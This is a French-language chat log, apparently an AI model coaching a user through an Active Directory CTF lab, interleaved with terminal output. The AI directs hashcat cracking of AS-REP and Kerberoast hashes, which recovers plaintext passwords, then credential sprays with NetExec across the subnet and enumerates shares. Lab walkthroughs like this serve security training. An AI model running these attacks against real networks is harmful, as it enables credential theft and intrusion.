SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.101    445    WK-101           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.111    445    WK-111           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.20     445    WK-020           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.30     445    WK-030           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.42     445    DC-CELESTINA     [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.137    445    WK-137           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.155    445    WK-155           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.132    445    WK-132           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.124    445    WK-124           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.10     445    WK-010           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.222    445    WK-222           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.202    445    WK-202           [+] celestina.shop\pentester:Password123! 

SMB         10.13.37.234    445    WK-234           [+] celestina.shop\pentester:Password123! 

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

[May 18, 2026 - 09:38:51 (CEST)] exegol-free /workspace # ls

20260518092435_computers.json   20260518092435_domains.json  20260518092435_groups.json  20260518092435_users.json  rockyou.txt    tgs.txt

20260518092435_containers.json  20260518092435_gpos.json     20260518092435_ous.json     asrep.txt                  rockyou.txt.1

[May 18, 2026 - 09:38:57 (CEST)] exegol-free /workspace # cat rockyou.txt                   

[May 18, 2026 - 09:39:05 (CEST)] exegol-free /workspace # 

Je vois exactement ce qui s'est passé, et c'est un piège classique sous Linux !

Regarde attentivement tes logs :

La commande gunzip a échoué car le fichier .gz n'existait pas, mais la redirection > rockyou.txt a quand même créé un fichier rockyou.txt totalement vide.

Ensuite, la commande wget s'est lancée en secours et a téléchargé le vrai dictionnaire, mais comme le nom était déjà pris par le fichier vide, elle l'a sauvegardé sous le nom rockyou.txt.1 (qui fait bien 133 Mo).

Tu as lancé Hashcat sur le fichier vide (rockyou.txt). Hashcat s'est terminé en 0 seconde avec le message "The wordlist is too small" car il n'y avait aucun mot de passe à tester !

Et pour ton nxc smb -x 'ipconfig' : il n'a rien affiché car l'utilisateur pentester n'est pas administrateur local sur ces machines (tu n'as pas eu le fameux Pwn3d!). Tu as le droit d'y accéder, mais pas d'y exécuter des commandes à distance de cette façon.

Voici comment débloquer la situation en quelques secondes.

Étape 1 : Réparer le dictionnaire
On va écraser le fichier vide avec le bon fichier fraîchement téléchargé :

Bash
mv rockyou.txt.1 rockyou.txt
Étape 2 : Relancer la casse des mots de passe
Maintenant que le dictionnaire est plein, on relance la machine !

Pour j.vabre (AS-REP) :

Bash
hashcat -m 18200 asrep.txt rockyou.txt
Pour g.clooney et k.cedepte (Kerberoast) :

Bash
hashcat -m 13100 tgs.txt rockyou.txt
Étape 3 : Le nouveau plan pour le Pivot
Laisse tourner Hashcat. Notre nouvel objectif est simple : récupérer les mots de passe en clair de ces 3 nouveaux utilisateurs. Dès que Hashcat nous les donnera, nous testerons ces nouveaux comptes avec NetExec sur le réseau. Il y a de très fortes chances que l'un d'entre eux soit Administrateur Local d'une machine, ce qui nous permettra enfin de lancer notre ipconfig pour trouver le réseau caché 10.37.13.0/24 !

Dis-moi dès que Hashcat a trouvé un mot de passe (il affichera le hash suivi de :le_mot_de_passe_en_clair tout en bas de son exécution).

[May 18, 2026 - 09:42:35 (CEST)] exegol-free /workspace # hashcat -m 13100 tgs.txt rockyou.txt

hashcat (v6.2.6) starting



OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]

==========================================================================================================================================

* Device #1: pthread--0x000, 1443/2950 MB (512 MB allocatable), 4MCU



Minimum password length supported by kernel: 0

Maximum password length supported by kernel: 256



Hashes: 2 digests; 2 unique digests, 2 unique salts

Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Rules: 1



Optimizers applied:

* Zero-Byte

* Not-Iterated



ATTENTION! Pure (unoptimized) backend kernels selected.

Pure kernels can crack longer passwords, but drastically reduce performance.

If you want to switch to optimized kernels, append -O to your commandline.

See the above message to find out about the exact limits.



Watchdog: Hardware monitoring interface not found on your system.

Watchdog: Temperature abort trigger disabled.



Host memory required for this attack: 0 MB



Dictionary cache hit:

* Filename..: rockyou.txt

* Passwords.: 14344384

* Bytes.....: 139921497

* Keyspace..: 14344384



[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q



Session..........: hashcat                                

Status...........: Quit

Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)

Hash.Target......: tgs.txt

Time.Started.....: Mon May 18 09:42:44 2026 (2 secs)

Time.Estimated...: Mon May 18 09:43:00 2026 (14 secs)

Kernel.Feature...: Pure Kernel

Guess.Base.......: File (rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........:  1771.5 kH/s (0.45ms) @ Accel:256 Loops:1 Thr:1 Vec:4

Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts

Progress.........: 3064832/28688768 (10.68%)

Rejected.........: 0/3064832 (0.00%)

Restore.Point....: 1531904/14344384 (10.68%)

Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#1....: mana85 -> mamaracho



Started: Mon May 18 09:42:44 2026

Stopped: Mon May 18 09:42:47 2026

[May 18, 2026 - 09:42:47 (CEST)] exegol-free /workspace # 

Ah, tu as appuyé sur la touche q et tu as quitté Hashcat en plein milieu de son travail ! (On le voit à la ligne Status...........: Quit).

Si tu regardes la ligne Time.Estimated, il ne lui restait pourtant que 14 petites secondes pour tester les 14 millions de mots de passe de la liste rockyou.txt.

Ce qu'il faut faire :
Relance exactement la même commande, mais cette fois-ci, lâche ton clavier et laisse-le terminer. Ne touche à rien. Quand il aura trouvé les mots de passe, il s'arrêtera tout seul et te les affichera clairement à l'écran.

Voici la commande à relancer :

Bash
hashcat -m 13100 tgs.txt rockyou.txt
Et n'oublie pas de faire la même chose pour ton autre fichier (le compte j.vabre) juste après :

Bash
hashcat -m 18200 asrep.txt rockyou.txt
Un pentester doit parfois faire preuve d'un tout petit peu de patience devant une barre de chargement ! Laisse-les tourner jusqu'au bout et donne-moi les mots de passe en clair qu'il te trouve !

maps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Rules: 1



Optimizers applied:

* Zero-Byte

* Not-Iterated

* Single-Hash

* Single-Salt



ATTENTION! Pure (unoptimized) backend kernels selected.

Pure kernels can crack longer passwords, but drastically reduce performance.

If you want to switch to optimized kernels, append -O to your commandline.

See the above message to find out about the exact limits.



Watchdog: Hardware monitoring interface not found on your system.

Watchdog: Temperature abort trigger disabled.



Host memory required for this attack: 0 MB



Dictionary cache built:

* Filename..: rockyou.txt

* Passwords.: 14344391

* Bytes.....: 139921497

* Keyspace..: 14344384

* Runtime...: 1 sec



$krb5asrep$23$j.vabre@CELESTINA.SHOP:8fa9ef862ba9e1f2783ce8681dbb6d29$cf51843d873e6971adb0ae7cb3bddf5e7bdfa1a4eb08805c61e17faccf7f46acc1c9fe3e49c47e1b830c2bb29f7c53c5c8495bf455f4f4c245b20b9a6c81d2502d7538bd45baccda5e7e69e9fec8c2d13dbd16f99c36d115e071d1a246259139b8f35500404790551f17ace9e0c14aabecbc653a8e696e65d8cbe1e2c6e3e7b5ad00c97a9821ec6692fdc3a647237fcaef0935f05528bdcf3b400d940e6cef78762e6a8d8943b95cdc2dfe2ed3469059519ba44bab042dd2e76f1d37b9882c3d16d0f6c1527df002296441b6f658432480ac733c0bcd1923cb05afbbd0e712ab8afad9f90c073d1926f88284f4ae3c95:Coffee4me!

                                                          

Session..........: hashcat

Status...........: Cracked

Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)

Hash.Target......: $krb5asrep$23$j.vabre@CELESTINA.SHOP:8fa9ef862ba9e1...ae3c95

Time.Started.....: Mon May 18 09:42:27 2026 (7 secs)

Time.Estimated...: Mon May 18 09:42:34 2026 (0 secs)

Kernel.Feature...: Pure Kernel

Guess.Base.......: File (rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........:  1730.4 kH/s (0.41ms) @ Accel:256 Loops:1 Thr:1 Vec:4

Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)

Progress.........: 11284480/14344384 (78.67%)

Rejected.........: 0/11284480 (0.00%)

Restore.Point....: 11283456/14344384 (78.66%)

Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#1....: ColumbianBrian -> Code Aelita132465



Started: Mon May 18 09:42:26 2026

Stopped: Mon May 18 09:42:35 2026

[May 18, 2026 - 09:42:35 (CEST)] exegol-free /workspace # hashcat -m 13100 tgs.txt rockyou.txt

hashcat (v6.2.6) starting



OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]

==========================================================================================================================================

* Device #1: pthread--0x000, 1443/2950 MB (512 MB allocatable), 4MCU



Minimum password length supported by kernel: 0

Maximum password length supported by kernel: 256



Hashes: 2 digests; 2 unique digests, 2 unique salts

Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Rules: 1



Optimizers applied:

* Zero-Byte

* Not-Iterated



ATTENTION! Pure (unoptimized) backend kernels selected.

Pure kernels can crack longer passwords, but drastically reduce performance.

If you want to switch to optimized kernels, append -O to your commandline.

See the above message to find out about the exact limits.



Watchdog: Hardware monitoring interface not found on your system.

Watchdog: Temperature abort trigger disabled.



Host memory required for this attack: 0 MB



Dictionary cache hit:

* Filename..: rockyou.txt

* Passwords.: 14344384

* Bytes.....: 139921497

* Keyspace..: 14344384



[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => q



Session..........: hashcat                                

Status...........: Quit

Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)

Hash.Target......: tgs.txt

Time.Started.....: Mon May 18 09:42:44 2026 (2 secs)

Time.Estimated...: Mon May 18 09:43:00 2026 (14 secs)

Kernel.Feature...: Pure Kernel

Guess.Base.......: File (rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........:  1771.5 kH/s (0.45ms) @ Accel:256 Loops:1 Thr:1 Vec:4

Recovered........: 0/2 (0.00%) Digests (total), 0/2 (0.00%) Digests (new), 0/2 (0.00%) Salts

Progress.........: 3064832/28688768 (10.68%)

Rejected.........: 0/3064832 (0.00%)

Restore.Point....: 1531904/14344384 (10.68%)

Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#1....: mana85 -> mamaracho



Started: Mon May 18 09:42:44 2026

Stopped: Mon May 18 09:42:47 2026

[May 18, 2026 - 09:42:47 (CEST)] exegol-free /workspace # hashcat -m 13100 tgs.txt rockyou.txt

hashcat (v6.2.6) starting



OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]

==========================================================================================================================================

* Device #1: pthread--0x000, 1443/2950 MB (512 MB allocatable), 4MCU



Minimum password length supported by kernel: 0

Maximum password length supported by kernel: 256



Hashes: 2 digests; 2 unique digests, 2 unique salts

Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Rules: 1



Optimizers applied:

* Zero-Byte

* Not-Iterated



ATTENTION! Pure (unoptimized) backend kernels selected.

Pure kernels can crack longer passwords, but drastically reduce performance.

If you want to switch to optimized kernels, append -O to your commandline.

See the above message to find out about the exact limits.



Watchdog: Hardware monitoring interface not found on your system.

Watchdog: Temperature abort trigger disabled.



Host memory required for this attack: 0 MB



Dictionary cache hit:

* Filename..: rockyou.txt

* Passwords.: 14344384

* Bytes.....: 139921497

* Keyspace..: 14344384



$krb5tgs$23$*g.clooney$CELESTINA.SHOP$celestina.shop/g.clooney*$c1ebab681ddf08c95c154ac12c179104$480611136c3bd296a07674f079d4162618ad52a4442965e1b69b557e63f6a551ad61020d3eacb6df5e07516991a6465dca4c0926ddbb2485431ad531668ccfceec535d8ca08def1d3c879085f856e00177e1bfbb516b38c06ba450a3fede30262504b4949ca0b022a78c6ab5214012267aaba862c8b88a6eef92dde803e32801bb5cbd7938ff4d74459cd66456638e189073f6d7570d27a1825b7ac9dac3ca7e5c6c3775befa4b8f0647a0944d4b6fb1913e7af890c42204943c1c86c89e7821c59d12987920158df97c8bf63bc1fdd722822f46db796a816956893b4113acc537d1483868bd7a1e2badaa03a80caa0a12a5775d0a288c0b778aea3e65f4c95004aa7bfb7b35390817908923b31110166251756afa047793f61cfc2213ae7204aac87825bb29919460d4107476f3435f1a4fe0bb0b8aa254024d58070021950240d6997797c0989c38c1deb469a63e6cebe09d8ea7313270b76f3af8aa1017d652f0921464b2385c791bdd0c87a15f036be76ac39a4f9259392a12b2d06fbdcc8f49795ef5e4787e40b03b0db2a991538b385d06601bb1b05dc4c550ef6b3c02935eb21ce76b066fddbe43c3d67adf4128aa4150be54159ce4d391a48171f0f3b06eb8166ea22bf9f8a1bd2b353963effb59a388f914bf6c39aae4d3c3d8d6c3aa79930fd9cf36a3f4f98e5ff2b1bfe06b61e60189dd40818186bcfec8c747f806c14441e73f0a6f9dd00954779ec87429256218e0e6221a01a2365aadcf723a7c8015f8e3c18622652decefb5b015b6a8d57bcdd6059376e77460a03dae405380523f1bd273cea25223e110b4ee8515e375959e543d7e3eba59acbd2a3211781566707f820083ae92bb4cdc04585851b51b04cc7fb80381bfcb2aaa805fb273453111e12d1802d1ed5c8228e1254ae385ae0fc8315ddb633cf10db12564aaeadd88ae4e9154c551fc7c387df63dc010500460f5d19dc4eb5ae080445ca06d6356b32706dc710705bfb2f1999a62e2e400c0746f59448212b41b253062381d8d460162d060c3ca3ce4a04af2e6403eece8cc4ac3a0b691257ccd135e257877d5c7c9a1b34d74a5ef76aba6e7ebbb2f25708939b1c1be23b0f143ecc3fe945b425861e0adf3e5060115bd76a9d85d3617910782c6f29f15366b79519f45863c919ef05c9e678a1fcd89043aae57b35abb27ae466f76c5fc0da2db5292868fbd744fe29280995d584072ea5744c955f8c502ac2d5da752106b4660409887d12c511f23f9e56cba69b9c3516e4216a5da9bb36f9e33d88515efa95f3cbe99631605aa0dd0cb39f7e6a44c77be32ff52810c8c787eeaded8c643ea8458b70d980afdb33bc703c63937eec87bd5ffb2299794981c224ba35265c1a96a96128abe2c34a5b14183b84c78115eb0df092c46ce66888333b4fc0e0faf8763700516287f0419563f0602407fe626c36257ce30a385edc330bdd7db0c23:CoffeeMug!1

Approaching final keyspace - workload adjusted.           



                                                          

Session..........: hashcat

Status...........: Exhausted

Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)

Hash.Target......: tgs.txt

Time.Started.....: Mon May 18 09:44:30 2026 (15 secs)

Time.Estimated...: Mon May 18 09:44:45 2026 (0 secs)

Kernel.Feature...: Pure Kernel

Guess.Base.......: File (rockyou.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........:  1835.5 kH/s (0.39ms) @ Accel:256 Loops:1 Thr:1 Vec:4

Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts

Progress.........: 28688768/28688768 (100.00%)

Rejected.........: 0/28688768 (0.00%)

Restore.Point....: 14344384/14344384 (100.00%)

Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:0-1

Candidate.Engine.: Device Generator

Candidates.#1....: $HEX[206b6d3831303838] -> $HEX[042a0337c2a156616d6f732103]



Started: Mon May 18 09:44:30 2026

Stopped: Mon May 18 09:44:46 2026

[May 18, 2026 - 09:44:47 (CEST)] exegol-free /workspace # 

C'est magnifique ! La patience a payé, tu as récupéré deux mots de passe en clair :

L'utilisateur AS-REP j.vabre a pour mot de passe : Coffee4me!

Le compte de service g.clooney a pour mot de passe : CoffeeMug!1
(Note : C'est tout à fait normal que k.cedepte n'ait pas été trouvé, dans les CTF il y a souvent de faux positifs ou des mots de passe trop complexes pour rockyou, on l'ignore).

Maintenant que nous avons de nouveaux identifiants, nous allons tester si l'un de ces deux utilisateurs possède les fameux droits d'Administrateur Local sur une machine du réseau. C'est ce qui nous donnera le tag Pwn3d! avec NetExec, et le droit de lancer notre commande ipconfig !

L'étape suivante : Trouver le Pwn3d!
Lance ces deux commandes l'une après l'autre pour tester tes nouveaux accès sur tout le réseau :

Test de j.vabre :

Bash
nxc smb 10.13.37.0/24 -u 'j.vabre' -p 'Coffee4me!'
Test de g.clooney :

Bash
nxc smb 10.13.37.0/24 -u 'g.clooney' -p 'CoffeeMug!1'
Regarde bien les résultats. Dès que tu vois un Pwn3d! (en vert ou jaune selon ton terminal) à côté d'une machine, relance la commande exacte qui t'a donné cet accès, mais en ajoutant -x 'ipconfig' à la fin.

Dis-moi sur quelle machine tu es administrateur, et si tu as enfin trouvé cette fameuse adresse IP cachée en 10.37.13.X !

[May 18, 2026 - 09:44:47 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'j.vabre' -p 'Coffee4me!'

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.10     445    WK-010           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.20     445    WK-020           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.30     445    WK-030           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.222    445    WK-222           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.137    445    WK-137           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.124    445    WK-124           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.111    445    WK-111           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.101    445    WK-101           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.155    445    WK-155           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.42     445    DC-CELESTINA     [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.202    445    WK-202           [+] celestina.shop\j.vabre:Coffee4me! 

SMB         10.13.37.234    445    WK-234           [+] celestina.shop\j.vabre:Coffee4me! 

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

[May 18, 2026 - 09:47:56 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'g.clooney' -p 'CoffeeMug!1'

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.132    445    WK-132           [*] Windows 11 Build 22621 x64 (name:WK-132) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.155    445    WK-155           [*] Windows 11 Build 22621 x64 (name:WK-155) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.123    445    WK-123           [*] Windows 11 Build 22621 x64 (name:WK-123) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.202    445    WK-202           [*] Windows 11 Build 22621 x64 (name:WK-202) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.234    445    WK-234           [*] Windows 11 Build 22621 x64 (name:WK-234) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.222    445    WK-222           [*] Windows 11 Build 22621 x64 (name:WK-222) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.111    445    WK-111           [*] Windows 11 Build 22621 x64 (name:WK-111) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.42     445    DC-CELESTINA     [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.44     445    WK-044           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.30     445    WK-030           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.132    445    WK-132           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.10     445    WK-010           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.124    445    WK-124           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.155    445    WK-155           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.101    445    WK-101           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.137    445    WK-137           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.123    445    WK-123           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.202    445    WK-202           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.234    445    WK-234           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.222    445    WK-222           [+] celestina.shop\g.clooney:CoffeeMug!1 

SMB         10.13.37.111    445    WK-111           [+] celestina.shop\g.clooney:CoffeeMug!1 

Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

[May 18, 2026 - 09:48:05 (CEST)] exegol-free /workspace # 

Mince ! C'est la frustration du pentester : on trouve de nouveaux mots de passe, on a accès aux machines, mais aucun d'entre eux ne nous donne le précieux (Pwn3d!). Cela signifie que ni j.vabre ni g.clooney ne sont administrateurs locaux sur le parc. On ne peut toujours pas utiliser -x ipconfig pour trouver notre réseau caché.

Pas de panique, c'est très courant. Il nous reste une dernière carte majeure à jouer : la fouille des partages réseau (SMB).

Très souvent, les administrateurs laissent des scripts, des fichiers de configuration, ou des notes avec des mots de passe dans des dossiers partagés. On va demander à NetExec de lister tous les partages sur toutes les machines et de nous montrer ce qui est accessible avec le compte pentester.

La chasse aux fichiers partagés
Lance cette commande :

Bash
nxc smb 10.13.37.0/24 -u 'pentester' -p 'Password123!' --shares
(Note : On utilise pentester car c'est lui qui semble avoir le plus de droits par défaut).

Regarde attentivement les colonnes "READ" et "WRITE" dans les résultats. Tu vas voir beaucoup de partages par défaut (IPC$, C$, ADMIN$), mais cherche un nom de partage inhabituel (par exemple, "IT", "Scripts", "Backup", "Public", etc.) sur lequel tu aurais un accès "READ".

Dès que tu as repéré un partage intéressant, dis-moi lequel et sur quelle machine (WK-XXX) il se trouve !

[May 18, 2026 - 09:48:05 (CEST)] exegol-free /workspace # nxc smb 10.13.37.0/24 -u 'pentester' -p 'Password123!' --shares 

SMB         10.13.37.30     445    WK-030           [*] Windows 11 Build 22621 x64 (name:WK-030) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.42     445    DC-CELESTINA     [*] Windows Server 2022 Build 20348 x64 (name:DC-CELESTINA) (domain:celestina.shop) (signing:True) (SMBv1:None) (Null Auth:True)

SMB         10.13.37.10     445    WK-010           [*] Windows 11 Build 22621 x64 (name:WK-010) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.20     445    WK-020           [*] Windows 11 Build 22621 x64 (name:WK-020) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.124    445    WK-124           [*] Windows 11 Build 22621 x64 (name:WK-124) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.101    445    WK-101           [*] Windows 11 Build 22621 x64 (name:WK-101) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.44     445    WK-044           [*] Windows 11 Build 22621 x64 (name:WK-044) (domain:celestina.shop) (signing:False) (SMBv1:None)

SMB         10.13.37.137    445    WK-137           [*] Windows 11 Build 22621 x64 (name:WK-137) (domain:celestina.shop) (signing:False) (SMBv1:None)

